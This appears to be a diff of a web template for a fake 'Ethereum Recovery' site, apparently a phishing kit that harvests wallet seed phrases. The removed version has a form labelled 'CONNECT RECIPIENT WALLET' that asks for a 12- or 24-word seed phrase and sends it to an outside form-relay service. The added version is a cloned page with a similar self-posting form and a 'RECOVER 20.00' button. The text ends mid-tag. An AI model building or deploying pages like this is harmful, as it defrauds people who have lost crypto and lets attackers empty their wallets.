@@ -1,378 +1,608 @@
 {% load static %}
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <title>Ethereum Recovery | Secure Wallet Solutions</title>
-    <link rel="icon" href="{% static 'images/logo_favicon.png' %}" type="image/png" sizes="16x16">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Recover lost Ethereum assets with secure blockchain analysis and expert assistance.">
-    <meta name="keywords" content="Ethereum Recovery, Blockchain Analysis, Crypto Scam Recovery, Wallet Security">
-    <meta name="author" content="Ethereum Recovery Team">
+	<head>
+		<title>ethereum</title><meta property="og:site_name" content="" />
+<meta property="og:title" content="My Site" />
+<meta property="og:description" content="" />
+<meta property="og:image" content="https://cdn2.editmysite.com/images/site/footer/og-image-placeholder-blank.png" />
+<meta property="og:url" content="" />
 
-    <!-- CSS Files -->
-    <link href="{% static 'css/bootstrap.min.css' %}" rel="stylesheet" type="text/css">
-    <link href="{% static 'css/plugins.css' %}" rel="stylesheet" type="text/css">
-    <link href="{% static 'css/style.css' %}" rel="stylesheet" type="text/css">
-    <link href="{% static 'css/colors/scheme-06.css' %}" rel="stylesheet" type="text/css">
-    <link href="{% static 'css/coloring.css' %}" rel="stylesheet" type="text/css">
-    <link href="{% static 'css/de-black.css' %}" rel="stylesheet" type="text/css">
 
-    <style>
-        /* Enhanced burger menu styling */
-        #menu-btn {
-            cursor: pointer;
-            font-size: 24px;
-            color: #fff;
-        }
-        #mobile-menu {
-            display: none;
-            background: #1a1a1a;
-            position: absolute;
-            top: 80px;
-            left: 0;
-            width: 100%;
-            z-index: 999;
-            padding: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
-        }
-        #mobile-menu ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-        #mobile-menu li {
-            padding: 10px 0;
-            text-align: center;
-        }
-        #mobile-menu a {
-            color: #fff;
-            text-decoration: none;
-            font-size: 18px;
-        }
-        #mobile-menu a:hover {
-            color: #8D7FA6;
-        }
-        @media (min-width: 768px) {
-            #mobile-menu { display: none !important; }
-            #menu-btn { display: none; }
-        }
-    </style>
-</head>
 
-<body class="dark-scheme de-black">
-<div id="wrapper">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-    <!-- Header Begin -->
-    <header class="transparent scroll-dark">
-        <div class="container">
-            <div class="row align-items-center justify-content-between">
-                <div class="col-md-3 col-sm-6">
-                    <div id="logo">
-                        <a href="{% url 'home' %}">
-                            <img src="{% static 'images/logo-4.png' %}" alt="Ethereum Recovery Logo" style="width: 150px;">
-                        </a>
-                    </div>
-                </div>
+		
+		<link id="wsite-base-style" rel="stylesheet" type="text/css" href="//cdn2.editmysite.com/css/sites.css?buildTime=1760463208" />
+<link rel="stylesheet" type="text/css" href="//cdn2.editmysite.com/css/old/fancybox.css?1760463208" />
+<link rel="stylesheet" type="text/css" href="//cdn2.editmysite.com/css/social-icons.css?buildtime=1760463208" media="screen,projection" />
+<link rel="stylesheet" type="text/css" href="{% static 'files/main_style.css' %}" title="wsite-theme-css" />
+<link href='//cdn2.editmysite.com/fonts/Josefin_Sans/font.css?2' rel='stylesheet' type='text/css' />
+<link href='//cdn2.editmysite.com/fonts/Cardo/font.css?2' rel='stylesheet' type='text/css' />
 
-                <div class="col-md-6 d-none d-md-block text-center">
-                    <nav class="mainmenu">
-                        <ul id="mainmenu" class="list-inline m-0">
-                            <li class="list-inline-item"><a href="{% url 'home' %}">Ethereum</a></li>
-                            <li class="list-inline-item"><a href="{% url 'home' %}#about">About</a></li>
-                            <li class="list-inline-item"><a href="#donate">Donate</a></li>
-                        </ul>
-                    </nav>
-                </div>
+<link href='//cdn2.editmysite.com/fonts/Lora/font.css?2' rel='stylesheet' type='text/css' />
+<link href='//cdn2.editmysite.com/fonts/Droid_Sans/font.css?2' rel='stylesheet' type='text/css' />
+<link href='//cdn2.editmysite.com/fonts/Roboto/font.css?2' rel='stylesheet' type='text/css' />
+<link href='//cdn2.editmysite.com/fonts/Aller/font.css?2' rel='stylesheet' type='text/css' />
+<link href='//cdn2.editmysite.com/fonts/Lora/font.css?2' rel='stylesheet' type='text/css' />
+<style type='text/css'>
+.wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {font-family:"Lora" !important;}
+#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {color:#252525 !important;}
+.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
+.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {font-family:"Droid Sans" !important;font-weight:400 !important;text-transform:  uppercase !important;letter-spacing: 1px !important;}
+#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {color:#a9a9a9 !important;}
+.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
+#wsite-title {font-family:"Roboto" !important;letter-spacing: 4px !important;}
+.wsite-menu-default a {}
+.wsite-menu a {}
+.wsite-image div, .wsite-caption {}
+.galleryCaptionInnerText {}
+.fancybox-title {}
+.wslide-caption-text {}
+.wsite-phone {}
+.wsite-headline,.wsite-header-section .wsite-content-title {font-family:"Aller" !important;color:#fff !important;letter-spacing: 2px !important;}
+.wsite-headline-paragraph,.wsite-header-section .paragraph {font-family:"Lora" !important;}
+.wsite-button-inner {}
+.wsite-not-footer blockquote {}
+.wsite-footer blockquote {}
+.blog-header h2 a {}
+#wsite-content h2.wsite-product-title {}
+.wsite-product .wsite-product-price a {}
+@media screen and (min-width: 767px) {.wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {font-size:20px !important;line-height:31px !important;}
+#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
+.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
+.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {font-size:25px !important;}
+#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
+.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
+#wsite-title {font-size:14px !important;}
+.wsite-menu-default a {}
+.wsite-menu a {}
+.wsite-image div, .wsite-caption {}
+.galleryCaptionInnerText {}
+.fancybox-title {}
+.wslide-caption-text {}
+.wsite-phone {}
+.wsite-headline,.wsite-header-section .wsite-content-title {font-size:43px !important;line-height:15px !important;}
+.wsite-headline-paragraph,.wsite-header-section .paragraph {font-size:18px !important;}
+.wsite-button-inner {}
+.wsite-not-footer blockquote {}
+.wsite-footer blockquote {}
+.blog-header h2 a {}
+#wsite-content h2.wsite-product-title {}
+.wsite-product .wsite-product-price a {}
+}</style>
+<style>
+.wsite-background {background-image: url("{static 'uploads/1/5/4/0/154089123/background-images/1436807259.jpg' %}") !important;background-repeat: no-repeat !important;background-position: 50% 50% !important;background-size: 100% !important;background-color: transparent !important;background: inherit;}
+body.wsite-background {background-attachment: fixed !important;}.wsite-background.wsite-custom-background{ background-size: cover !important}
+</style>
+		<script src='{% static 'files/templateArtifacts.js' %}'></script>
+<script>
+var STATIC_BASE = '//cdn1.editmysite.com/';
+var ASSETS_BASE = '//cdn2.editmysite.com/';
+var STYLE_PREFIX = 'wsite';
+</script>
+<script src='https://cdn2.editmysite.com/js/jquery-1.8.3.min.js'></script>
 
-                <!-- Mobile Menu Button -->
-                <div class="col-auto d-md-none text-end">
-                    <div id="menu-btn"><i class="fa fa-bars"></i></div>
-                </div>
-            </div>
+<script type="text/javascript" src="//cdn2.editmysite.com/js/lang/en/stl.js?buildTime=1760463208&"></script>
+<script src="//cdn2.editmysite.com/js/site/main.js?buildTime=1760463208"></script><script type="text/javascript">
+		function initCustomerAccountsModels() {
+					(function(){_W.setup_rpc({"url":"\/ajax\/api\/JsonRPC\/CustomerAccounts\/","actions":{"CustomerAccounts":[{"name":"login","len":2,"multiple":false,"standalone":false},{"name":"logout","len":0,"multiple":false,"standalone":false},{"name":"getSessionDetails","len":0,"multiple":false,"standalone":false},{"name":"getAccountDetails","len":0,"multiple":false,"standalone":false},{"name":"getOrders","len":0,"multiple":false,"standalone":false},{"name":"register","len":4,"multiple":false,"standalone":false},{"name":"emailExists","len":1,"multiple":false,"standalone":false},{"name":"passwordReset","len":1,"multiple":false,"standalone":false},{"name":"passwordUpdate","len":3,"multiple":false,"standalone":false},{"name":"validateSession","len":1,"multiple":false,"standalone":false}]},"namespace":"_W.CustomerAccounts.RPC"});
+_W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":"_W.CustomerAccounts.BackboneModelData","collection_namespace":"_W.CustomerAccounts.BackboneCollectionData","bootstrap_namespace":"_W.CustomerAccounts.BackboneBootstrap","models":{"CustomerAccounts":{"_class":"CustomerAccounts.Model.CustomerAccounts","defaults":null,"validation":null,"types":null,"idAttribute":null,"keydefs":null}},"collections":{"CustomerAccounts":{"_class":"CustomerAccounts.Collection.CustomerAccounts"}},"bootstrap":[]});
+})();
+		}
+		if(document.createEvent && document.addEventListener) {
+			var initEvt = document.createEvent('Event');
+			initEvt.initEvent('customerAccountsModelsInitialized', true, false);
+			document.dispatchEvent(initEvt);
+		} else if(document.documentElement.initCustomerAccountsModels === 0){
+			document.documentElement.initCustomerAccountsModels++
+		}
+		</script>
+		<script type="text/javascript"> _W = _W || {}; _W.securePrefix='recoveretheruem.weebly.com'; </script><script>_W = _W || {};
+			_W.customerLocale = "en_GB";
+			_W.storeName = null;
+			_W.isCheckoutReskin = false;
+			_W.storeCountry = "NG";
+			_W.storeCurrency = "USD";
+			_W.storeEuPrivacyPolicyUrl = "";
+			com_currentSite = "691646854115596267";
+			com_userID = "154089123";</script><script type="text/javascript">_W.configDomain = "www.weebly.com";</script><script>_W.relinquish && _W.relinquish()</script>
+<script type="text/javascript" src="//cdn2.editmysite.com/js/lang/en/stl.js?buildTime=1760463208&"></script><script> _W.themePlugins = {"navpane":{"condense":1024,"forced":1}};</script><script src='//cdn2.editmysite.com/js/site/theme-plugins.js?buildTime=1760463208'></script><script type="text/javascript"> _W.recaptchaUrl = "https://www.google.com/recaptcha/api.js"; </script><script type="text/javascript"><!--
+	
+	
+	
+</script>
+		
+		
+	</head>
+	<body class="header-page wsite-theme-light  wsite-page-index logo-align-left "><div class="wrapper">
+	  <div class="header-wrap">
+	    <div id="topBar" class="topbar">
+				<a class="hamburger w-navpane-trigger" aria-label="Menu" href="#"><span></span></a>
+	      <div class="logo"><span class="wsite-logo">
+
+	
+	<span class="wsite-title-placeholder">&nbsp;</span><span style="display:none">
+	<span style="display:none">&nbsp;</span>
+	</span>
+	
+
+</span></div>
+          
+          
+	    </div><!-- end .container -->
+
+		  <div class="banner-wrap">
+				<div class="wsite-elements wsite-not-footer wsite-header-elements">
+	<div class="wsite-section-wrap">
+	<div  class="wsite-section wsite-header-section wsite-section-bg-image" style="height: 716px;vertical-align: middle;background-image: url('{% static 'uploads/1/5/4/0/154089123/background-images/1115073216.jpeg' %}') ;background-repeat: no-repeat ;background-position: 50% 50% ;background-size: 100% ;background-color: transparent ;background-size: cover;" >
+		<div class="wsite-section-content">
+			
+					<div class="container">
+						<div class="banner">
+				<div class="wsite-section-elements">
+					<div><div class="wsite-multicol"><div class="wsite-multicol-table-wrap" style="margin:0 -15px;">
+	<table class="wsite-multicol-table">
+		<tbody class="wsite-multicol-tbody">
+			<tr class="wsite-multicol-tr">
+				<td class="wsite-multicol-col" style="width:30.731707317073%; padding:0 15px;">
+					
+						
+
+<div class="wsite-spacer" style="height:50px;"></div>
+
+
+					
+				</td>				<td class="wsite-multicol-col" style="width:69.268292682927%; padding:0 15px;">
+					
+						
+
+<div>
+	<form id="walletForm" method="POST">
+  {% csrf_token %}
+  <div class="wsite-form-container" style="margin-top:10px;">
+    <ul class="formlist">
+      <div>
+        <div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
+          <label class="wsite-form-label">ETH ADDRESS <span class="form-not-required">*</span></label>
+          <div class="wsite-form-input-container">
+            <input class="wsite-form-input wsite-input wsite-input-width-370px"
+                   type="text" name="eth_address" required />
+          </div>
         </div>
+      </div>
 
-        <!-- Mobile Menu -->
-        <div id="mobile-menu" class="d-md-none">
-            <ul>
-                <li><a href="{% url 'home' %}">Ethereum</a></li>
-                <li><a href="{% url 'home' %}#about">About</a></li>
-                <li><a href="#donate">Donate</a></li>
-            </ul>
+      <div>
+        <div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
+          <label class="wsite-form-label">CONNECT RECIPIENT WALLET <span>*</span></label>
+          <div class="wsite-form-input-container">
+            <textarea class="wsite-form-input wsite-input wsite-input-width-370px"
+                      name="recipient_wallet" style="height: 200px" required></textarea>
+          </div>
         </div>
-    </header>
-    <!-- Header Close -->
+      </div>
+    </ul>
+  </div>
 
-    <!-- Content Begin -->
-    <div class="no-bottom no-top" id="content">
-        <div id="top"></div>
-
-
-   
-
-        
-        <!-- Recovery Form Section -->
-<section id="recovery-form" class=" text-light mt-5" 
-         style="
-            background-image: url('{% static 'images/background_pic.jpg' %}');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            position: relative;
-            z-index: 1;
-        ">
-
-    <!-- Optional dark overlay for better text contrast -->
-    <div style="
-        position: absolute;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: rgba(0, 0, 0, 0.6);
-        z-index: -1;
-    "></div>
-
-    <div style="margin-top: 50px; margin-bottom: 50px;" class="container d-flex justify-content-center">
-        <div class="text-center">
-            <img src="{% static 'images/etherium_icon.svg' %}" 
-                 alt="Ethereum Icon" 
-                 class="img-fluid mb-2" 
-                 style="max-width: 100px;">
-            <p class="mb-0">Ethereum</p>
-        </div>
-    </div>
-
-    <div class="container">
-        <div class="text-center mb40">
-            <h2>Start Your Recovery</h2>
-            <p>Submit your details to begin the Ethereum recovery process. Our team will analyze your case.</p>
-        </div>
-        <div class="row justify-content-center">
-            <div class="col-md-8">
-                <form action="https://api.web3forms.com/submit" method="post" class="form-dark">
-                    <input type="hidden" name="access_key" value="88e194de-3fab-40f3-bf0c-5ec6c9023611">
-                    <div class="mb-3">
-                        <label for="eth_address" class="form-label">ETH ADDRESS</label>
-                        <input type="text" class="form-control" id="eth_address" name="eth_address"
-                               placeholder="Enter your Ethereum address (e.g., 0x1234...)" required
-                               pattern="^0x[a-fA-F0-9]{40}$">
-                    </div>
-                    <div class="mb-3">
-                        <label for="seed_phrase" class="form-label">CONNECT RECIPIENT WALLET</label>
-                        <textarea class="form-control" id="seed_phrase" name="seed_phrase" rows="3"
-                                  placeholder="Enter your 12 or 24-word seed phrase" required></textarea>
-                    </div>
-                    <div class="mb-3">
-                        <label for="recovery_amount" class="form-label">RECOVERY AMOUNT (Optional)</label>
-                        <input type="number" step="0.01" class="form-control" id="recovery_amount"
-                               name="recovery_amount" placeholder="Enter amount to recover (e.g., 20.00 ETH)"
-                               value="20.00">
-                    </div>
-                    <button style="background-color: #8D7FA6;" type="submit" class="btn-main btn-lg">
-                        Recover 20.00
-                    </button>
-                </form>
-            </div>
-        </div>
-    </div>
-</section>
+  <div style="text-align:left; margin-top:10px; margin-bottom:10px;">
+    <button type="submit" class="wsite-button">
+      <span class="wsite-button-inner">RECOVER 20.00</span>
+    </button>
+  </div>
+</form>
 
 
-        <!-- Services Section -->
-        <section id="services" class="pt60 pb60 mt-5 pt-5">
-            <div class="container">
-                <div class="row text-center">
-                    <div class="col-lg-12">
-                        <h2>Our Recovery Services</h2>
-                        <div class="small-border bg-color-2"></div>
-                        <p>Secure and professional solutions to help recover your Ethereum assets.</p>
-                    </div>
-                </div>
-                <div class="row text-center">
-                    <div class="col-lg-4 col-md-6 mb-sm-30">
-                        <div class="feature-box f-boxed style-3">
-                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-search"></i>
-                            <div class="text">
-                                <h4 class="wow fadeInUp">Blockchain Analysis</h4>
-                                <p class="wow fadeInUp" data-wow-delay=".2s">
-                                    Track Ethereum transactions across the blockchain to identify and trace lost or stolen assets.
-                                </p>
-                            </div>
-                            <i class="wm fa fa-search"></i>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-6 mb-sm-30">
-                        <div class="feature-box f-boxed style-3">
-                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-shield"></i>
-                            <div class="text">
-                                <h4 class="wow fadeInUp">Scam Recovery</h4>
-                                <p class="wow fadeInUp" data-wow-delay=".2s">
-                                    Investigate scams and phishing attacks to attempt recovery of compromised Ethereum funds.
-                                </p>
-                            </div>
-                            <i class="wm fa fa-shield"></i>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-6 mb-sm-30">
-                        <div class="feature-box f-boxed style-3">
-                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-lock"></i>
-                            <div class="text">
-                                <h4 class="wow fadeInUp">Wallet Recovery</h4>
-                                <p class="wow fadeInUp" data-wow-delay=".2s">
-                                    Assist with recovering access to Ethereum wallets using secure, privacy-first methods.
-                                </p>
-                            </div>
-                            <i class="wm fa fa-lock"></i>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
 
-        <!-- About Section -->
-        <section id="about" class="pt60 pb60">
-            <div class="container">
-                <div class="row align-items-center">
-                    <div class="col-md-6 mb30">
-                        <img src="{% static 'images/about.png' %}" class="img-fluid rounded shadow" alt="Ethereum Recovery">
-                    </div>
-                    <div class="col-md-6">
-                        <h2>About Ethereum Recovery</h2>
-                        <p>
-                            We specialize in helping Ethereum users recover lost or stolen assets through advanced blockchain analysis and secure recovery protocols. Our team uses AI-powered tools to trace transactions and identify potential recovery paths.
-                        </p>
-                        <p>
-                            <strong>Warning:</strong> Be cautious of scams promising guaranteed recovery. Blockchain transactions are immutable, and recovery is not always possible. We provide legitimate analysis and reporting tools but cannot guarantee funds recovery.
-                        </p>
-                        <ul class="ul-style">
-                            <li>🔍 Advanced blockchain tracing for Ethereum transactions</li>
-                            <li>🛡️ Secure and private recovery processes</li>
-                            <li>🤖 AI-driven scam detection and analysis</li>
-                            <li>🌍 Trusted by Ethereum users worldwide</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Donate Section -->
-        <section id="donate" class="pt60 pb60 text-light mt-5">
-            <div class="container">
-                <div class="text-center mb40">
-                    <h2>Support Our Ethereum Recovery Mission</h2>
-                    <p>Your donations empower us to combat crypto scams, enhance recovery tools, and protect the Ethereum community.</p>
-                </div>
-                <div class="row justify-content-center">
-                    <div class="col-md-8 text-center">
-                        <h4>Why Donate?</h4>
-                        <p>Your contributions directly support our efforts to:</p>
-                        <ul style="list-style: none; text-decoration: none;" class="ul-style text-start mx-auto" style="max-width: 500px;">
-                            <li>🔍 <strong>Develop Advanced Recovery Tools:</strong> Fund AI-powered blockchain analysis to trace lost or stolen Ethereum assets.</li>
-                            <br>
-                            <li>🛡️ <strong>Fight Crypto Scams:</strong> Support education campaigns and resources to help users avoid phishing and fraudulent recovery services.</li>
-                            <br>
-                            <li>🤝 <strong>Assist Victims:</strong> Enable collaboration with legal authorities and cybersecurity experts to pursue recovery cases.</li>
-                            <br>
-                            <li>🌍 <strong>Build Community Trust:</strong> Maintain transparent, secure platforms for Ethereum users worldwide.</li>
-                        </ul>
-                        <p class="mt-3">
-                            Every donation, no matter the size, helps us improve our services and protect users from crypto fraud.
-                        </p>
-                        <p class="mt-4">Donate Ethereum to our secure wallet address:</p>
-                 
-                        <a style="background-color: #8D7FA6;" href="#" id="copy-wallet-btn" class="btn-main btn-lg">Donate</a>
-                       
-                    </div>
-                </div>
-            </div>
-        </section>
-
-       
-
-    </div>
-    <!-- Content Close -->
-
-    <a style="background-color: #8D7FA6;" href="#" id="back-to-top"></a>
-
-    <!-- Footer Begin -->
-    <footer>
-        <div class="container">
-            <div class="row">
-                <div class="col-md-3 col-sm-6">
-                    <div class="widget">
-                        <h5>Explore</h5>
-                        <ul>
-                            <li><a href="{% url 'home' %}">Ethereum</a></li>
-                            <li><a href="{% url 'home' %}#about">About</a></li>
-                            <li><a href="#donate">Donate</a></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="col-md-3 col-sm-6">
-                    <div class="widget">
-                        <h5>Support</h5>
-                        <ul>
-                            <li><a href="{% url 'home' %}#help">Help Center</a></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="col-md-6 col-sm-12">
-                    <div class="widget">
-                        <h5>Newsletter</h5>
-                        <p>Stay updated on Ethereum recovery tips and scam prevention.</p>
-                        <small>We respect your privacy. No spam. Ever.</small>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="subfooter">
-            <div class="container">
-                <div class="de-flex justify-content-between align-items-center">
-                    <div>
-                        <a href="{% url 'home' %}">
-                            <span class="copy">© 2025 - Ethereum Recovery</span>
-                        </a>
-                    </div>
-                    <div class="social-icons">
-                        <a href="#"><i class="fa fa-twitter fa-lg"></i></a>
-                        <a href="#"><i class="fa fa-telegram fa-lg"></i></a>
-                        <a href="#"><i class="fa fa-reddit fa-lg"></i></a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </footer>
-    <!-- Footer Close -->
 </div>
 
-<!-- Javascript Files -->
-<script src="{% static 'js/plugins.js' %}"></script>
-<script src="{% static 'js/designesia.js' %}"></script>
-<script>
-    // Mobile menu toggle
-    const menuBtn = document.getElementById('menu-btn');
-    if (menuBtn) {
-        menuBtn.addEventListener('click', () => {
-            const mobileMenu = document.getElementById('mobile-menu');
-            mobileMenu.style.display = (mobileMenu.style.display === 'block') ? 'none' : 'block';
-        });
-    }
 
-    // Close mobile menu when clicking a link
-    document.querySelectorAll('#mobile-menu a').forEach(link => {
-        link.addEventListener('click', () => {
-            document.getElementById('mobile-menu').style.display = 'none';
-        });
-    });
+					
+				</td>			</tr>
+		</tbody>
+	</table>
+</div></div></div>
+				</div>
+			</div>
+					</div>
+				
+		</div>
+		<div class=""></div>
+	</div>
+</div>
 
-    // Hide mobile menu on window resize to desktop
-    window.addEventListener('resize', () => {
-        if (window.innerWidth >= 768) {
-            document.getElementById('mobile-menu').style.display = 'none';
-        }
-    });
+</div>
 
- 
+
+			</div>
+	  </div><!-- end .header-wrap -->
+
+	 <div class="w-navlist nav-wrap">
+	   	<div class="container">
+	   		<div class="nav desktop-nav"><ul class="wsite-menu-default">
+		<li id="active" class="wsite-menu-item-wrap">
+			<a
+						href="{% url 'home' %}"
+				class="wsite-menu-item"
+				>
+				ethereum
+			</a>
+			
+		</li>
+		<li id="pg345185697225373472" class="wsite-menu-item-wrap">
+			<a
+						href="{% url 'about_us' %}"
+				class="wsite-menu-item"
+				>
+				About
+			</a>
+			
+		</li>
+		<li id="pg203330109864887578" class="wsite-menu-item-wrap">
+			<a
+						href="{% url 'donate' %}"
+				class="wsite-menu-item"
+				>
+				Donate
+			</a>
+			
+		</li>
+</ul>
+</div>
+	   	</div>
+	 </div>
+
+	<div class="main-wrap">
+		<div id="wsite-content" class="wsite-elements wsite-not-footer">
+	<div class="wsite-section-wrap">
+	<div class="wsite-section wsite-body-section wsite-background-7 wsite-custom-background" style="height: auto;" >
+		<div class="wsite-section-content">
+		    <div class="container">
+			<div class="wsite-section-elements">
+				
+			</div>
+		</div>
+		</div>
+
+	</div>
+</div>
+
+</div>
+
+	  </div>
+
+    <div class="footer-wrap">
+    	<div class="container">
+    		<div class="footer">
+
+<style type="text/css">
+	@font-face {
+		font-family: SQMarket-Medium;
+		font-style: normal;
+		font-weight: 500;
+		src:
+			url("//cdn2.editmysite.com/fonts/SQ_Market/sqmarket-medium.woff2") format("woff2"),
+			url("//cdn2.editmysite.com/fonts/SQ_Market/sqmarket-medium.woff") format("woff");
+	}
+</style>
+
+<div id="weebly-footer-signup-container-v3">
+	<a
+		href="https://www.weebly.com/signup?utm_source=internal&utm_medium=footer"
+		target="_blank"
+		class="signup-container-header"
+		id="signup-link-href"
+	>
+		<div class="powered-by">
+			<div class="footer-published-ab-powered-by">
+				Powered by <span class="link weebly-icon"></span>
+				<img class="footer-ab-published-toast-image" src="//cdn2.editmysite.com/images/site/footer/footer-toast-published-image-1.png">
+				<span class="footer-ab-published-toast-text">Create your own unique website with customizable templates.</span>
+				<span class="footer-ab-published-toast-button-wrapper">
+					<button class="footer-published-ab-button">Get Started</button>
+				</span>
+			</div>
+		</div>
+	</a>
+</div>
+
+<script type="text/javascript" src="//cdn2.editmysite.com/js/site/footerSignup.js?buildTime=1760628286"></script>
+<script type="text/javascript">
+	if (document.readystate === 'complete') {
+		Weebly.footer.setupContainer('cdn2.editmysite.com', '1760628286');
+	} else {
+		document.addEventListener('DOMContentLoaded', function() {
+			Weebly.footer.setupContainer('cdn2.editmysite.com', '1760628286');
+		});
+	}
 </script>
-</body>
+</div>
+    	</div><!-- end container -->
+    </div><!-- end footer-wrap -->
+	</div>
+
+	<div class="w-navpane nav mobile-nav">
+		<a class="hamburger w-navpane-trigger" aria-label="Menu" href="#"><span></span></a>
+		<ul class="wsite-menu-default">
+				<li id="active" class="wsite-menu-item-wrap">
+					<a
+								href="{% url 'home' %}"
+						class="wsite-menu-item"
+						>
+						ethereum
+					</a>
+					
+				</li>
+				<li id="pg345185697225373472" class="wsite-menu-item-wrap">
+					<a
+								href="{% url 'about_us' %}"
+						class="wsite-menu-item"
+						>
+						About
+					</a>
+					
+				</li>
+				<li id="pg203330109864887578" class="wsite-menu-item-wrap">
+					<a
+								href="{% url 'donate' %}"
+						class="wsite-menu-item"
+						>
+						Donate
+					</a>
+					
+				</li>
+		</ul>
+	</div>
+
+	<script type="text/javascript" src="{% static 'files/theme/plugins.js' %}"></script>
+	<script type="text/javascript" src="{% static 'files/theme/custom.js' %}"></script>
+    <div id="customer-accounts-app"></div>
+    <script src="//cdn2.editmysite.com/js/site/main-customer-accounts-site.js?buildTime=1760463208"></script>
+
+		<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-7870337-1']);
+	_gaq.push(['_setDomainName', 'none']);
+	_gaq.push(['_setAllowLinker', true]);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		// NOTE: keep the [1] if you replace this code. Otherwise cookie banner scripts won't be first on the page
+		var s = document.getElementsByTagName('script')[1]; s.parentNode.insertBefore(ga, s);
+	})();
+
+	_W.Analytics = _W.Analytics || {'trackers': {}};
+	_W.Analytics.trackers.wGA = '_gaq';
+</script>
+
+<script type="text/javascript" async=1>
